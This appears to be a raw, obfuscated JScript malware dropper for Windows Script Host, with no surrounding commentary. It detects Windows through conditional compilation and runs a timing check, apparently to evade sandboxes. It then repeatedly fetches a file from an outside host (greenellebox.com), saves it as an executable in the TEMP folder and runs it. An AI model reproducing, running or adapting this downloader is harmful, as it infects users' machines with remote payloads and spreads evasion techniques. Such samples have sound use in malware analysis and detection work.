var tp = false;
var II = "CreateObject";
var z0 = function bP() {return WScript[II]("WScript.Shell");}(), wa = 11;
var R = "MSXML2.XMLHTTP";
var H = 2123213;
var m = 0;
function t(s){z0["Run"](s, m, m);};
function lv(){return "" + R;};
function l(xx, q0){m = m * 1; return xx - q0;};
function V(){return II;};
/*@cc_on
  @if (@_win32 || @_win64)
    tp = true;
  @end
@*/
if (tp)
{
var TL = "";
function Q(){return 22;};
var v = 0; var N = 0;
function M()
{
var Q0 = new this["Date"]();
var U = Q0["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var Q0 = new this["Date"]();
var l0 = Q0["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var Q0 = new this["Date"]();
var QO = Q0["getUTCMilliseconds"]();
var v = "ap";
v = l(l0, U);
var N = "z";
N = l(QO, l0);
TL = "open";
return l(v, N);
}
var vU = false;
var bv = false;
for (var M0 = m; M0 < Q() * 1; M0++){if (M() != m){
vU = true; 
N = "31" + 11 * v + N; 
bv = true; 
break;
}}
function jB() {return ((vU == true) && (vU == bv)) ? 1 : m;};
if (vU && jB() && bv){
function Fu() {return z0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "7o1h5gfaAc.exe";};
 R0 = lv();
 w = WScript[II](R0);
 var q = 1;
 while (q){
try {
w[TL]("GET", "http://greenellebox.com/a1odk", false);
w["send"]();
M1 = "Sleep";
for (;;){WScript[M1](Q() * 11); if (w["readystate"] >= 2 * 2) break;};
q = m;
} catch(g){};
}
function J(f) {var CZ = (1, 2, 3, 4, 5, f); return CZ;};
g0 = WScript[V()]("ADODB.Stream");
R0 = g0;
R0[TL]();
R0["type"] = J(1);
R0["write"](w["ResponseBody"]);
g0["position"] = J(m);
R0["Save" + "ToFile"](Fu(), 2);
g0["c"+"lose"]();
RI = Fu();
t(RI);
}
}

